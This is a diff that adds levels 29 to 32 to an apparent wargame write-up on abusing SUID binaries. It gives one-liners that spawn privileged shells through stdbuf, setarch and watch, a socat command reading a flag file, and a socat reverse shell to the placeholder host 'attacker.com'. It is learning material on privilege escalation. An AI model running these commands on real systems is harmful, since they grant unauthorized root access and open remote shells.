@@ -171,3 +171,70 @@ level 28: **timeout**---> start COMMAND, and kill it if still running after DURA
 timeout 7d /bin/sh -p
 ```
 
+level 29: **stdbuf**---> modify the buffer mode and size of the standard stream
+
+> `-i, --input=MODE`	adjust standard input stream buffering
+>
+> `-o, --output=MODE`	adjust standard output stream buffering
+>
+> `-e, --error=MODE`	adjust standard error stream buffering
+
+- If MODE is `L` the corresponding stream will be line buffered.This option is invalid with standard input.
+
+
+- If MODE is `0` the corresponding stream will be unbuffered.
+
+```shell
+stdbuf -i0 /bin/sh -p
+```
+
+level 30: **setarch**--->change reported **architecture** in new program **environment** and set personality flags 
+
+```shell
+setarch $(arch) /bin/sh -p #arch can set to the i386
+```
+
+level 31: **watch**---> listen by timing the output of other commands to a terminal, repeat the command every 2 seconds
+
+Usage: `watch [options] command`
+
+```shell
+watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
+#-x, --exec		pass command to exec instead of "sh -c"
+#-c, --color	interpret ANSI color and style sequences
+```
+
+ `exec 1>&0`：This redirects standard output to standard input, because when a  terminal is opened by default, 0,1 and 2 all point to the same  location, which is the current terminal. So this statement restarts  standard output. At this point, execute the command we can see the output
+
+`reset`：Sets the status of the terminal, we can use it to return the terminal to its original state
+
+`sh [parameter] command`
+
+```shell
+-c:command to read from a string
+-i:realize interaction scripts
+-n:do a syntax check
+-x:implement detailed statement of tracking
+```
+
+level 32: **socat**
+
+- It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+
+  ```shell
+  socat -u "file:$TheFileToRead_flag" - #can get the flag
+  #-u unidirectional mode (left to right)
+  ```
+
+- Limited SUID: we can run **socat file:`tty`,raw,echo=0 tcp-listen:12345** on the attacker box to receive the shell
+
+  tty：Teletype, A terminal device consisting of a virtual console, serial port, and pseudo-terminal devices
+
+  ```shell
+  RHOST=attacker.com
+  RPORT=12345
+  socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+  #I didn't succed to get the shell(cry...)
+  ```
+
+  
